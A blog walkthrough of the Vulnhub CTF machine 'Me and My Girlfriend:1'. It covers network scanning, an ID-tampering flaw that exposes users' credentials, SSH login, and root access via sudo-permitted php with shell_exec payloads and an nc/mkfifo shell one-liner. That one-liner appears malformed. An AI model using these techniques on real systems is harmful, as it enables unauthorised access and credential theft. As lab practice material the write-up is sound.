---
layout: post
title: Me and My Girlfriend:1 Walkthrough
categories: [CTF,Vulnhub]
---

As usual I start to scan network. I used masscan as it is faster compare to nmap. I scanned for port 80 as this is common port for CTF machines.
```
masscan -p80 192.168.1.0/24
```

![](/images/vuln_me_girlfriend/masscan.png)

I noticed that only 2 target as available. As one of that is my default gateway i decide to can 192.168.1.73. In your case... 99% IP address will be different.

I decide to to full scan againts this machine. I used nmap
```
nmap -A -sV -T4 -p- 192.168.1.73
```
I used these options as -A will give you os datection and script scanning. Always use -sV to get version detection. I know that -A -sV are same so dont judge :) Option -T4 is more aggresive scanning that normal. and -p- is shortcut to scan all ports.

![](/images/vuln_me_girlfriend/nmap_full_scan.png)

As you can see from output only port 80 and 22 are open. I decide to explore port 80. I lunched webbrowser and get some 'felling' how web sites is looking. 

![](/images/vuln_me_girlfriend/webpage_index.png)

As you can see there is some login/register options and some static pages. 
After register i was able to log in and was redirect to home page as register user. Except change profile there was nothing interesting. 

![](/images/vuln_me_girlfriend/test_profile.png)

As you can see from url there is ID=14. I decide to change to 1 and BINGO. I was able to see profiles of other users. 
You could decide to check every user and grab his/her username and password. Them you can run hydra against port 22. But as from describtion of this machine Alice was person who was hiding something. I found Alice profile and decide to use her credentials to login into machine...

![](/images/vuln_me_girlfriend/ssh_login.png)

I was in. With little poking around Alice has hidden folder with all her secrets and also first flag. 

![](/images/vuln_me_girlfriend/flag_1.png)

After start looking for priviledge escalation as start searching for some sticky bits or some clues. Them after reading few linux simple priviledge escalation tricks. I tried this command

```
sudo -l
```

This command will show commands which you can run as sudo with out root password. I command was there... php. Created some simple shell.php file below.

```php
<?php
$output = shell_exec('ls /root');
echo "$output";
?>
```

Run it as 
```bash
sudo php -f shell.php
```
and get list files from root directory. There was on only one file... flag2.txt. Decide to change my php file a  little bit to get output of this file

```php
<?php
$output = shell_exec('cat /root/flag2.txt');
echo "$output";
?>
```

and hurray got second flag...

![](/images/vuln_me_girlfriend/flag_2.png)

That's it all, right? Well i was happy i pwned this machine but them i asked my self. Can I used this priviledge escalation misconfiguration to get proper root shell? Challange accepted. I know you can use nc and -e to bind bash to you but version nc on that machine was did not have -e. After asking my search engine for help. I was able to find article where this exact nc version can be use to get access to shell. I changed my shell to this one.

```php
<?php
$a = shell_exec('mkfifo f');
$a = shell_exec('nc localhost 4444 0<f | /bin/sh -i 2>&1 | tee -f');
?>
```

Run 'screen' commnad to have to virtual sessions. Lunch nc to listen on port 4444. Move to second session and run my php file. BAAAM i have root shell :) 

![](/images/vuln_me_girlfriend/root_shell.md)

I hope you like this walkthrough
